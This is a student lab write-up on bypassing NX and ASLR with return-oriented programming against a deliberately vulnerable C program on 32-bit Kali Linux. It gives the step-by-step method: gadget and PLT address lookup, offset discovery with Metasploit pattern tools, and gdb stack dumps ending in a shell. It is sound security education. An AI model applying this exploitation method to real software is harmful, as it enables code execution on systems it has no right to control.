Steven Comer
Protection Bypass for NX and ASLR
24 April 2016

Project goal:
	Use Return-Oriented Programming (ROP) to bypass NX and ASLR on a modern Linux system
	
Implementation description:
	Find some key locations that are static, even with ASLR
		bss
		strcpy address in the plt
		system address in the plt
	Find a suitable ROP gadget for strcpy, which takes two arguments
		pop|pop|ret at some location in the binary
	Find existing characters in the binary to construct an argument to system call
		used "sh; "
	Build payload that uses strcpy ROP gadgets to write "sh; " to bss
	Overflow buffer
	Insert payload
	Achieve arbitrary execution
		
Implementation files:
	vuln.c -- vulnerable C program
	exploit.py -- constructs ROP payload and exploits vuln binary

Software used:
	Kali Linux x86 v2016.1
	ROPgadget v5.4 (pip install ROPgadget)
	gcc v3.5.1

Protection:
	NX on by default in gcc version 5.3.1
	ASLR on by default in Kali Linux 2016.1

Compile with:
	gcc -g -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln vuln.c
		*default value of 4 for stack boundary option breaks this implementation
		*stack canaries (or stack protectors) break this implementation

Look for pop|pop|ret:
	ROPgadget --binary vuln --only "pop|ret"
	0x080484ba : pop edi ; pop ebp ; ret

Look for system@plt and strcpy@plt:
	gdb vuln
	disas main
	0x08048449 <+46>:    call   0x80482f0 <system@plt>
	0x0804843a <+31>:    call   0x80482e0 <strcpy@plt>

Look for address of bss:
	objdump -x vuln | grep bss
	080496f0 l    d  .bss	00000000              .bss

Look for addresses of "sh; ":
	ROPgadget --binary vuln --memstr "sh; "
	0x08048142 : 's'
	0x080482e6 : 'h'
	0x080484ef : ';'
	0x08048018 : ' '

Determine the correct amount of filler to put in the payload before the ROP section:
	locate pattern_create
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 100
	unique_string = 		Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

	Use the following as input:
	"A"*1000 + unique_string
	
	Identify the bytes that overwrite EIP:
	0x62413961
	
	locate pattern_offset	
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 62413961
	[*] Exact match at offset 28
	This means that EIP is overwritten starting with payload[1028]
	Payload is constructed accordingly, see exploit.py
	
Run the exploit:
	chmod +x exploit.py
	./exploit.py

Use gdb to examine the stack before and after payload is written
	(gdb) disas main
	Dump of assembler code for function main:
	   0x0804841b <+0>:	push   ebp
	   0x0804841c <+1>:	mov    ebp,esp
	   0x0804841e <+3>:	sub    esp,0x400
	   0x08048424 <+9>:	cmp    DWORD PTR [ebp+0x8],0x2
	   0x08048428 <+13>:	jne    0x8048444 <main+41>
	   0x0804842a <+15>:	mov    eax,DWORD PTR [ebp+0xc]
	   0x0804842d <+18>:	add    eax,0x4
	   0x08048430 <+21>:	mov    eax,DWORD PTR [eax]
	   0x08048432 <+23>:	push   eax
	   0x08048433 <+24>:	lea    eax,[ebp-0x400]
	   0x08048439 <+30>:	push   eax
	   0x0804843a <+31>:	call   0x80482e0 <strcpy@plt>
	   0x0804843f <+36>:	add    esp,0x8
	   0x08048442 <+39>:	jmp    0x8048451 <main+54>
	   0x08048444 <+41>:	push   0x80484e0
	   0x08048449 <+46>:	call   0x80482f0 <system@plt>
	   0x0804844e <+51>:	add    esp,0x4
	   0x08048451 <+54>:	mov    eax,0x0
	   0x08048456 <+59>:	leave  
	   0x08048457 <+60>:	ret    
	End of assembler dump.

	(gdb) b *0x0804843a
	(gdb) b *0x0804843f
	
	(gdb) r
	Breakpoint 3, 0x0804843a in main (argc=2, argv=0xbffff094) at vuln.c:8
	8			strcpy(buffer,argv[1]);

	(gdb) x/100x $esp-0x100
	0xbfffeaf0:	0x464c457f	0x03010101	0x00000000	0x00000000
	0xbfffeb00:	0x00030003	0x00000001	0x00018870	0x00000034
	0xbfffeb10:	0x001b4e88	0x00000000	0x00200034	0x0028000a
	0xbfffeb20:	0x00430044	0x00000006	0x00000034	0x00000034
	0xbfffeb30:	0x00000034	0x00000140	0x00000140	0x00000005
	0xbfffeb40:	0x00000004	0x00000003	0x00167764	0x00167764
	0xbfffeb50:	0x00167764	0x00000013	0x00000013	0x00000004
	0xbfffeb60:	0x00000001	0x00000001	0x00000000	0x00000000
	0xbfffeb70:	0x00000000	0x001b090c	0x001b090c	0x00000005
	0xbfffeb80:	0x00001000	0x00000001	0x001b0f5c	0x001b1f5c
	0xbfffeb90:	0x001b1f5c	0x000030b8	0x00005f80	0x00000006
	0xbfffeba0:	0x00001000	0x00000002	0x001b2da4	0x001b3da4
	0xbfffebb0:	0x001b3da4	0x000000f0	0x000000f0	0x00000006
	0xbfffebc0:	0x00000004	0x00000004	0x00000174	0x00000174
	0xbfffebd0:	0x00000174	0x00000044	0x00000044	0x00000004
	0xbfffebe0:	0x00000004	0x00000007	0x001b0f5c	0x001b1f5c
	0xbfffebf0:	0xbfffebf8	0xbffff225	0x0000004c	0x00000004
	0xbfffec00:	0x00000004	0x6474e550	0x00167778	0x00167778
	0xbfffec10:	0x00167778	0x000060a4	0x000060a4	0x00000004
	0xbfffec20:	0x00000004	0x6474e551	0x00000000	0x00000000
	0xbfffec30:	0x00000000	0x00000000	0x00000000	0x00000006
	0xbfffec40:	0x00000010	0x6474e552	0xb7fe4879	0xb7fff000
	0xbfffec50:	0xbfffeed8	0x00000000	0x00000000	0xb7fe92de
	0xbfffec60:	0x00000000	0x00000000	0x00000000	0x00000003
	0xbfffec70:	0x00554e47	0x73014131	0x7c05a230	0x00000000

	(gdb) ni
	Breakpoint 2, 0x0804843f in main (argc=134513850, argv=0x80496f0 <completed>) at vuln.c:8
	8			strcpy(buffer,argv[1]);

	(gdb) x/100x $esp-0x100
	0xbfffeaf0:	0x464c457f	0x03010101	0x00000000	0x00000000
	0xbfffeb00:	0xb7fffae8	0xbfffeb20	0xb7fff930	0x08048226
	0xbfffeb10:	0x00000000	0xbfffebb4	0x00200034	0x0028000a
	0xbfffeb20:	0xffffffff	0x00000006	0xb7e08544	0xb7fd9860
	0xbfffeb30:	0x00000034	0x00000140	0x00000140	0x00000005
	0xbfffeb40:	0x00000004	0x00000003	0x00167764	0x00167764
	0xbfffeb50:	0x00167764	0x00000013	0x00000013	0x00000004
	0xbfffeb60:	0xb7fe5e50	0xb7fff000	0x080481bc	0xb7fd9b58
	0xbfffeb70:	0xb7fff930	0xb7feabaa	0xb7fffae8	0xb7fd9b58
	0xbfffeb80:	0x00000001	0x00000001	0x00000000	0xb7e7a6f6
	0xbfffeb90:	0xb7fff000	0xb7feac52	0x00005f80	0x0804820c
	0xbfffeba0:	0x080496dc	0x00000001	0x001b2da4	0x001b3da4
	0xbfffebb0:	0x001b3da4	0xb7e08544	0x000000f0	0x00000006
	0xbfffebc0:	0xb7feaafb	0xb7fb8000	0x00000000	0x08048320
	0xbfffebd0:	0xbfffeff8	0xb7ff1120	0xbffff024	0xb7e8d430
	0xbfffebe0:	0xbfffebf8	0xb7fb8000	0x08048320	0x0804843f
	0xbfffebf0:	0xbfffebf8	0xbffff225	0x41414141	0x41414141
	0xbfffec00:	0x41414141	0x41414141	0x41414141	0x41414141
	0xbfffec10:	0x41414141	0x41414141	0x41414141	0x41414141
	0xbfffec20:	0x41414141	0x41414141	0x41414141	0x41414141
	0xbfffec30:	0x41414141	0x41414141	0x41414141	0x41414141
	0xbfffec40:	0x41414141	0x41414141	0x41414141	0x41414141
	0xbfffec50:	0x41414141	0x41414141	0x41414141	0x41414141
	0xbfffec60:	0x41414141	0x41414141	0x41414141	0x41414141
	0xbfffec70:	0x41414141	0x41414141	0x41414141	0x41414141

	(gdb) c
	
	# echo "ROP ftw!"

Resources:
	http://www.slideshare.net/saumilshah/dive-into-rop-a-quick-introduction-to-return-oriented-programming
	https://www.exploit-db.com/docs/28479.pdf
	https://github.com/DSUcoder/CSC-840/blob/master/Cycle05/ROP.pdf
	https://www.trustwave.com/Resources/SpiderLabs-Blog/Baby-s-first-NX-ASLR-bypass/

